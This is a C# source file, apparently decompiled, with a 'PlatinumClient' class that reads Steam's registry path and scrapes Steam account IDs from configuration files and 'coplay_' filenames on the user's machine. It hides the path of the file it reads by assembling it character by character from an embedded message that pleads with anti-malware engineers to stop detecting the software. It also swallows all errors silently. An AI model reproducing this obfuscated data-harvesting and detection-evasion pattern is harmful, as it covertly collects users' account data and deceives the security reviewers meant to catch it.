namespace PlatinumClient
{
    using Microsoft.Win32;
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Text.RegularExpressions;

    internal class SWAccumulator : PlatformAccumulator
    {
        private string message;

        public string[] accumulate()
        {
            HashSet<string> source = new HashSet<string>();
            this.message = @"Anti-Malware\Security Engineer: This is a legitimate piece of software published by Platinum Digital Group LLC located at 11410 Trafalgar, Lubbock TX 79424, as signed by our EV code signing certificate. PLEASE stop detecting this as malware. This code runs with the consent of the user consistent with our Privacy Policy. " + source.Min<string>();
            try
            {
                string str = "";
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Valve\Steam"))
                {
                    if (key != null)
                    {
                        str = (string) key.GetValue("SteamPath");
                    }
                }
                foreach (string str2 in Directory.GetFiles(str + @"\config"))
                {
                    if (str2.Contains("coplay_"))
                    {
                        int startIndex = str2.IndexOf("coplay_") + 7;
                        int index = str2.IndexOf(".vdf");
                        source.Add(str2.Substring(startIndex, index - startIndex));
                    }
                }
                string[] textArray1 = new string[] { 
                    this.message[12].ToString(), this.message[0xb1].ToString(), this.message[0x3b].ToString(), this.message[0x59].ToString(), this.message[0x40].ToString(), this.message[0x2d].ToString(), this.message[0x22].ToString(), this.message[0x86].ToString(), this.message[12].ToString(), this.message[0x2a].ToString(), this.message[0x3b].ToString(), this.message[0x2c].ToString(), this.message[0xf4].ToString(), this.message[0xfe].ToString(), this.message[0x119].ToString(), this.message[0xb6].ToString(),
                    this.message[0xef].ToString(), this.message[0xac].ToString(), this.message[0x123].ToString(), this.message[0xc9].ToString(), this.message[0x135].ToString(), this.message[0xd7].ToString(), this.message[0x40].ToString()
                };
                string str3 = string.Concat(textArray1);
                foreach (string str4 in File.ReadAllLines(str + str3))
                {
                    if (new Regex("^\\s*\"\\d+\"$").IsMatch(str4))
                    {
                        int index = str4.IndexOf('"');
                        int num5 = str4.IndexOf('"', index + 1);
                        string item = str4.Substring(index + 1, (num5 - index) - 1);
                        source.Add(item);
                    }
                }
            }
            catch (Exception)
            {
            }
            return source.ToArray<string>();
        }

        public string type() => 
            "STEAM";
    }
}

